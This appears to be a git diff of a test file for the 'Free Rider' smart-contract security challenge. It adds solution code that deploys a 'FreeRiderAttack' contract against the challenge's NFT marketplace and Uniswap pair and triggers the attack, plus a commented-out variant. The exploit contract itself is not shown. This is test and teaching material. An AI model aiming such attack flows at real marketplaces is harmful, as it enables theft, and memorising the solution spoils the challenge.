@@ -105,7 +105,11 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const FreeRiderAttacker = await ethers.getContractFactory("FreeRiderAttack", player);
+        this.attackerContract = await FreeRiderAttacker.deploy(marketplace.address,weth.address,uniswapPair.address, nft.address, devsContract.address);
+
+        await this.attackerContract.attack({value: ethers.utils.parseEther("0.03")});
+        
     });
 
     after(async function () {
@@ -128,3 +132,17 @@ describe('[Challenge] Free Rider', function () {
         expect(await ethers.provider.getBalance(devsContract.address)).to.be.eq(0);
     });
 });
+
+
+/* 
+
+        //make contract
+        const AttackerContractFactory = await ethers.getContractFactory("FreeRiderAttack",player);
+        attackerContract = await AttackerContractFactory.deploy(
+            marketplace.address, weth.address, uniswapPair.address, nft.address, devsContract.address, 
+        )
+        //send our money and call attack
+       await attackerContract.attack({value:ethers.utils.parseEther("0.045")});
+
+
+*/
